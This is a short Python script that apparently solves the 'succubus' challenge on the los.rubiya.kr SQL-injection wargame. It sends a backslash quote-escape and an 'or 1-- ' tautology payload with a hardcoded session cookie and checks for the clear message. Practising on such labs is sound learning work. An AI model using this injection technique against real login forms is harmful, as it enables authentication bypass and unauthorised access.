import requests

url = 'https://los.rubiya.kr/chall/succubus_37568a99f12e6bd2f097e8038f74d768.php'
cookie = {'PHPSESSID': 'dutaujsbjbkbm42o5v5t948kfm'}
payload = f"?id=\&pw=or 1-- "

r = requests.get(url + payload, cookies=cookie)
if 'SUCCUBUS Clear!' in r.text:
    print('SUCCUBUS Clear!')
